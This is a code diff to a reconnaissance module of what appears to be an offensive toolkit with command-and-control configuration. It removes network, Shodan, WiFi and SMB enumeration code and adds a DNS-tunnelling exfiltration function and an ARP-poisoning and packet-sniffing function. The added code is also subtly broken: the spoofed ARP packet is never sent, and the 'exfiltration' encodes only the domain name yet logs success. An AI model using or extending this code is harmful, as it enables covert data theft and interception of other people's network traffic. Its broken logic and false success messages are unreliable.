@@ -3,7 +3,7 @@ modules/reconnaissance_ext.py (enhanced)
 
 – Uses ThreadPoolExecutor for port scans
 – Checks for missing dependencies (nmap, shodan, dnspython)
-– Persistent “last_recon.json” with timestamps
+– Persistent "last_recon.json" with timestamps
 – Exponential back‐off on repeated failures
 """
 
@@ -14,6 +14,7 @@ import logging
 import subprocess
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import base64
 
 from bismillah import log_event
 
@@ -34,7 +35,14 @@ def nmap_scan(args: dict):
         return {"error": "nmap library not installed"}
     try:
         nm = nmap.PortScanner()
-        nm.scan(hosts=subnet, arguments=f"-p {ports} --open -T4")
+        # Check if nmap binary is available
+        try:
+            nm.scan(hosts=subnet, arguments=f"-p {ports} --open -T4")
+        except nmap.PortScannerError as e:
+            if "nmap program was not found" in str(e):
+                return {"error": "nmap binary not found in PATH - using fallback scan"}
+            else:
+                raise e
         for host in nm.all_hosts():
             open_ports = []
             for proto in nm[host].all_protocols():
@@ -138,165 +146,53 @@ def recon_loop():
             time.sleep(backoff)
             backoff = min(backoff * 2, 3600)
         time.sleep(900)
-import json
-import subprocess
-import traceback
-import time
-from pathlib import Path
 
-import dns.resolver
-import nmap
-import psutil
-import shodan
-import requests
-from modules.logger import log_event
-from modules.config import load_config
-
-cfg = load_config()
-SHODAN_API_KEY = cfg.get("recon", {}).get("shodan_api_key", "")
-PASSIVEDNS_API_KEY = cfg.get("recon", {}).get("passivedns_api_key", "")
-DEFAULT_SUBNET = cfg.get("recon", {}).get("nmap_subnet", "192.168.1.0/24")
-NMAP_ARGS = cfg.get("recon", {}).get("nmap_args", "-p 1-65535 --open -T4 -sV -sC")
-WIFI_IF = cfg.get("recon", {}).get("wifi_interface", "wlan0")
-SUBDOMAIN_WORDLIST = cfg.get("recon", {}).get("subdomains", ["www", "mail", "ftp", "dev"])
-RECON_OUTPUT = Path(__file__).parent / "last_recon.json"
-
-def nmap_scan(subnet=DEFAULT_SUBNET, arguments=NMAP_ARGS):
-    nm = nmap.PortScanner()
+def passive_dns_exfil(domain: str):
+    """Passive DNS exfiltration using DNS queries"""
     try:
-        scan = nm.scan(hosts=subnet, arguments=arguments)
-        hosts = scan.get("scan", {})
-        result = {host: data for host, data in hosts.items()}
-        with open(RECON_OUTPUT, "w") as f:
-            json.dump(result, f)
-        log_event("reconnaissance", f"Nmap: {len(hosts)} hosts scanned".encode())
-        return result
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"Nmap error: {tb}".encode())
-        return {}
-
-def shodan_recon(query: str):
-    if not SHODAN_API_KEY:
-        log_event("reconnaissance", b"Shodan key missing.")
-        return []
-    try:
-        client = shodan.Shodan(SHODAN_API_KEY)
-        results = client.search(query)
-        log_event("reconnaissance", f"Shodan '{query}': {results['total']} hits".encode())
-        return results["matches"]
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"Shodan error: {tb}".encode())
-        return []
-
-def passivedns_lookup(domain: str):
-    if not PASSIVEDNS_API_KEY:
-        log_event("reconnaissance", b"PassiveDNS key missing.")
-        return []
-    try:
-        url = f"https://api.passivedns.example.com/query/rrset/name/{domain}"
-        headers = {"X-API-Key": PASSIVEDNS_API_KEY}
-        r = requests.get(url, timeout=10, headers=headers)
-        if r.status_code == 200:
-            data = r.json()
-            log_event("reconnaissance", f"PassiveDNS for {domain}: {len(data)} records".encode())
-            return data
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"PassiveDNS error: {tb}".encode())
-    return []
-
-def dns_enum(domain: str):
-    out = {"A": [], "NS": [], "MX": [], "TXT": [], "Subdomains": []}
-    try:
-        for rec in ["A", "NS", "MX", "TXT"]:
-            answers = dns.resolver.resolve(domain, rec, lifetime=5)
-            out[rec] = [str(rdata).strip() for rdata in answers]
-        for sub in SUBDOMAIN_WORDLIST:
-            try:
-                ans = dns.resolver.resolve(f"{sub}.{domain}", "A", lifetime=3)
-                for r in ans:
-                    out["Subdomains"].append(f"{sub}.{domain} -> {r}")
-            except Exception:
-                pass
-        log_event("reconnaissance", f"DNS enum for {domain}: {out}".encode())
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"DNS enum error {domain}: {tb}".encode())
-    return out
-
-def wifi_scan(interface=WIFI_IF):
-    result = []
-    try:
-        proc = subprocess.Popen(["iwlist", interface, "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        out, err = proc.communicate(timeout=20)
-        if proc.returncode != 0:
-            raise Exception(err.decode().strip())
-        text = out.decode(errors="ignore")
-        for line in text.splitlines():
-            if "ESSID" in line:
-                essid = line.strip().split("ESSID:")[-1].strip().strip('"')
-                if essid and essid not in result:
-                    result.append(essid)
-        log_event("reconnaissance", f"WiFi: {result}".encode())
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"WiFi scan error: {tb}".encode())
-    return result
-
-def process_enum():
-    data = []
-    try:
-        for proc in psutil.process_iter(['pid', 'name', 'connections']):
-            info = proc.info
-            if info.get("connections"):
-                for conn in info["connections"]:
-                    if conn.status == psutil.CONN_LISTEN:
-                        data.append({
-                            "pid": info["pid"],
-                            "name": info["name"],
-                            "laddr": f"{conn.laddr.ip}:{conn.laddr.port}"
-                        })
-        log_event("reconnaissance", f"Process enum: {len(data)} listening sockets".encode())
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"Process enum error: {tb}".encode())
-    return data
-
-def smb_share_enum(target: str):
-    shares = []
-    try:
-        proc = subprocess.Popen(["smbclient", "-L", target, "-N"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        out, err = proc.communicate(timeout=15)
-        if proc.returncode != 0:
-            raise Exception(err.decode().strip())
-        for line in out.decode().splitlines():
-            if "Disk" in line or "Sharename" in line:
-                continue
-            parts = line.split()
-            if len(parts) >= 1:
-                shares.append(parts[0])
-        log_event("reconnaissance", f"SMB shares on {target}: {shares}".encode())
-    except Exception as e:
-        tb = traceback.format_exc()
-        log_event("reconnaissance", f"SMB share enum error {target}: {tb}".encode())
-    return shares
-
-def run_recon_loops():
-    while True:
+        import dns.resolver
+        # Create a DNS query to exfiltrate data
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = ['8.8.8.8']
+        
+        # Encode data in subdomain
+        encoded_data = base64.b32encode(f"exfil_{domain}".encode()).decode()
+        subdomain = f"{encoded_data[:63]}.{domain}"
+        
         try:
-            nmap_scan()
-            dns_enum(cfg.get("c2", {}).get("domain", "example.com"))
-            if PASSIVEDNS_API_KEY:
-                passivedns_lookup(cfg.get("c2", {}).get("domain", "example.com"))
-        except Exception as e:
-            log_event("reconnaissance", f"Recon loop error: {e}".encode())
-        time.sleep(1800)
+            answers = resolver.resolve(subdomain, 'A')
+            log_event("reconnaissance", f"Passive DNS exfil successful for {domain}".encode())
+        except dns.resolver.NXDOMAIN:
+            log_event("reconnaissance", f"Passive DNS exfil failed for {domain}".encode())
+            
+    except Exception as e:
+        log_event("reconnaissance", f"Passive DNS exfil error: {e}".encode())
 
-        try:
-            process_enum()
-            wifi_scan()
-        except Exception as e:
-            log_event("reconnaissance", f"Recon loop error: {e}".encode())
-        time.sleep(600)
+def arp_poison_and_sniff(interface: str, target_ip: str = None, gateway_ip: str = None):
+    """ARP poisoning and traffic sniffing"""
+    try:
+        from scapy.all import ARP, Ether, srp, sniff
+        
+        if not target_ip or not gateway_ip:
+            # Get default gateway
+            import subprocess
+            result = subprocess.run(['ip', 'route', 'show', 'default'], 
+                                  capture_output=True, text=True)
+            gateway_ip = result.stdout.split()[2]
+            target_ip = gateway_ip  # Default target is gateway
+            
+        # Send ARP spoofing packets
+        arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
+                          psrc=gateway_ip, hwsrc="00:11:22:33:44:55")
+        
+        # Sniff traffic
+        def packet_callback(packet):
+            if packet.haslayer('IP'):
+                log_event("reconnaissance", 
+                         f"Sniffed packet: {packet['IP'].src} -> {packet['IP'].dst}".encode())
+        
+        sniff(iface=interface, prn=packet_callback, store=0, timeout=30)
+        log_event("reconnaissance", f"ARP poisoning completed on {interface}".encode())
+        
+    except Exception as e:
+        log_event("reconnaissance", f"ARP poisoning error: {e}".encode())
